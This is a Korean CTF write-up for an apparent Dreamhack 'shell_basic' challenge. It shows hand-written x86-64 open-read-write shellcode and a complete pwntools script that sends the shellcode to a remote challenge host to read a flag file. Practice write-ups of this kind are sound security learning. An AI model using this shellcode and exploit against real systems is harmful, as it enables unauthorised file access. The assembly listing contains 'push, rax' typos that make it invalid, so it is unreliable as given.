풀이 1

저희는 파일의 위치가 /home/shell_basic/flag_name_is_loooooong 라는 것을 알아냈습니다. 이를 Shellcode 공부 때에 사용한 방법 그대로 공격에 사용이 가능합니다.

문제에서는 execve의 사용을 금지하였으니 저는 orw 쉘코드를 사용하여 문제를 해결하고자 합니다.

이때에 주의를 해야할 것은 그 위치가 리틀 엔디안 방식으로 입력해야하기 때문에 반대로 입력해야 한다는 것입니다. 그리고 반대시 가장 먼저 스택에 널 값을 입력하여 끝을 표시해야 합니다. 안 그러면 이상한 값까지 같이 딸려오기 때문입니다. 이를 어셈블리로 변환하면 아래와 같은 형태입니다.

    // 스택에 문자열을 위한 공간을 할당
    "push 0x0\n"               

    // 문자열을 메모리에 저장
    "mov rax, 0x676e6f6f6f6f6f6f\n" 
    "push rax\n"         // 문자열의 일부분을 rsp + 48에 저장

    "mov rax, 0x6c5f73695f656d61\n" 
    "push rax\n"         

    "mov rax, 0x6e5f67616c662f63\n" //리틀 엔디안 형식이라서 스택에 반대로 문자열 넣었다
    "push rax\n"         

    "mov rax, 0x697361625f6c6c65\n" 
    "push, rax\n"  

    "mov rax, 0x68732f656d6f682f\n" 
    "push, rax\n"                

    // 파일 열기 준비
    "mov rdi, rsp    # rdi = '/home/shell_basic/flag_name_is_loooooong'\n"
    "xor rsi, rsi    # rsi = 0 ; RD_ONLY\n"
    "xor rdx, rdx    # rdx = 0\n"
    "mov rax, 2      # rax = 2 ; syscall_open\n"
    "syscall         # open('/home/shell_basic/flag_name_is_loooooong', RD_ONLY, NULL)\n"
    "\n"
    
    // 파일 읽기 준비
    "mov rdi, rax      # rdi = fd\n"
    "sub rsp, 0x30     # rsp를 조정하여 버퍼 생성\n" // 버퍼를 위한 공간을 만듭니다.
    "mov rsi, rsp      # rsi = 버퍼 위치\n"
    "mov rdx, 0x30     # rdx = 0x30 ; len\n"
    "mov rax, 0x0      # rax = 0 ; syscall_read\n"
    "syscall           # read(fd, buf, 0x30)\n"
    "\n"
    
    // 내용을 stdout으로 쓰기 준비
    "mov rdi, 1        # rdi = 1 ; fd = stdout\n"
    "mov rax, 0x1      # rax = 1 ; syscall_write\n"
    "syscall           # write(fd, buf, 0x30)\n"
    "\n"
    
    // 프로그램 종료
    "xor rdi, rdi      # rdi = 0\n"
    "mov rax, 0x3c	   # rax = sys_exit\n"
    "syscall		   # exit(0)"

풀이 2

위에서는 어셈블리 코드를 스켈레톤 코드로 작성한 것이라면 이번에는 순수한 pwn 툴을 사용하여 진행해보겠습니다.
pwntools에 쉘 코드를 작성해주는 함수인 shellcraft()가 있습니다.

shellcraft() 함수를 이용해서 쉘 코드를 작성해보면

# 쉘 코드는 환경에 따라 영향을 받기 때문에, 먼저 아키텍처 정보를 x86-64로 지정해줍니다.
context.arch = "amd64"
# open할 flag 파일 path
path = "/home/shell_basic/flag_name_is_loooooong"

shellcode = shellcraft.open(path)	# open("/home/shell_basic/flag_name_is_loooooong")
# open() 함수 결과는 rax 레지스터에 저장됩니다. → fd = rax
shellcode += shellcraft.read('rax', 'rsp', 0x30)	# read(fd, buf, 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)	# write(stdout, buf, 0x30)
shellcode = asm(shellcode)	# shellcode를 기계어로 변환하여 대입

전체 익스플로잇 코드는 

#!/usr/bin/python3

from pwn import *  # Import pwntools module

p = remote('host3.dreamhack.games', '19672')  

context.arch = "amd64"

# Payload 정의 (바이트 형식)

path = "/home/shell_basic/flag_name_is_loooooong"

shellcode = shellcraft.open(path)
shellcode += shellcraft.read('rax', 'rsp', 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)
shellcode = asm(shellcode)

# Send the payload

payload = shellcode

p.sendlineafter("shellcode: ", payload)    # "shellcode: "가 출력되면 payload + '\n'을 입력
print(p.recv(0x30))

이 방식을 사용하면 직접 쉘 코드를 작성하고 추출할 필요 없이 알아서 쉘코드를 만들고 전송이 가능해집니다. 굳이 리틀엔디안 형식으로 경로를 변환할 필요도 없고요
